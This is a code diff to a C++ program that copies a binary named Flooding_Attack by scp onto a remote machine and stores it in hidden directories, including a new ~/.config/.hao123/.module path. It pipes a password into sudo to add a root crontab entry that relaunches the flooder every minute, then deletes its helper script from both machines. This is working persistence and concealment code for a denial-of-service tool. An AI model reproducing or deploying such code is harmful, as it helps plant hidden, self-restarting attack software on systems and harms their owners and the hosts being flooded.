@@ -40,12 +40,22 @@ int main(int argc, char **argv) {
         ":~/.etc/.module/Flooding_Attack"
     );
 
+    // send Flooding_Attack to hidden dictionary 2
+    cmd(ssh_prefix + " \'ls -al ~ | grep .config > /dev/null || mkdir ~/.config\'");
+    cmd(ssh_prefix + " \'ls -al ~/.config/ | grep .hao123 > /dev/null || mkdir ~/.config/.hao123\'");
+    cmd(ssh_prefix + " \'ls -al ~/.config/.hao123 | grep .module > /dev/null || mkdir ~/.config/.hao123/.module\'");
+    cmd(
+        "scp -o IdentitiesOnly=yes Flooding_Attack " +
+        username + "@" + ip_addr +
+        ":~/.config/.hao123/.module/Flooding_Attack"
+    );
+
     // create Add_crontab file
-    string crontab_content1 = "* * * * * root pgrep Flooding_Attack > /dev/null || cd /home/" + username + "/.etc/.module && ./Flooding_Attack";
+    string crontab_content1 = "* * * * * root pgrep Flooding_Attack > /dev/null || (cd /home/" + username + "/.etc/.module && ./Flooding_Attack) || (cd /home/" + username + "/.config/.hao123/.module && ./Flooding_Attack)";
 
     ofstream *file = new ofstream("Add_crontab");
     *file << "#! /bin/bash\n\n";
-    *file << "echo \"" + password + "\" | sudo -S sh -c \'echo \"" + crontab_content1 + "\" >> /etc/crontab\'";
+    *file << "echo \"" + password + "\" | sudo -S sh -c \'echo \"" + crontab_content1 + "\" >> /etc/crontab\'\n";
     delete file;
     cmd("chmod +x Add_crontab");
 
@@ -57,4 +67,6 @@ int main(int argc, char **argv) {
 
     // remove bash script 
     cmd(ssh_prefix + " \'rm Add_crontab\'");
+    cmd("rm Add_crontab");
+
 }
